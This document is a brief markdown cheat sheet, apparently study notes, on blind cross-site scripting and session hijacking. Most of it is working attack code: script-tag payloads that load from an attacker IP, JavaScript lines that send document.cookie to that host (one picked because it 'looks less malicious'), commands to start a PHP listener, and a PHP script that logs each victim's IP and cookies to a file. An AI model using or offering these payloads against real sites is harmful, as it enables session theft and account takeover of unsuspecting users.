# Session Hijacking
## Blind XSS Detection
### When the vulnerability is triggered on a page we don't have access to. Occasionally occurs with forms only accessible by certain users (e.g. Admins)
### We can use a trick, which is to use a JavaScript payload that sends an HTTP request back to our server.
### But still we have 2 issues :
1. We don't know which specific field is vulnerable
2. We don't know what XSS payload to use

## Remote script
```HTML
<script src="http://IP:PORT/script.js"/>
```

## Using a PHP listening server instead of netcat
```BASH
$ mkdir /tmp/tmpsrogue
$ cd /tmp/tmpsrogue
$ vi index.php #write our index.php file
$ sudo php -S 0.0.0.0:80
$ PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

## Finding a working XSS payload
```HTML
<script src=http://OUR_IP/fullname></script> 
<script src=http://OUR_IP/username></script> 
....
```
## After finding a working XSS let's proceed to XSS exploitation and Session Hijacking attack
```JS
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie; //this one is better because it looks less malcious
```

## PHP script to split and write to a txt file the session cookies
```PHP
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

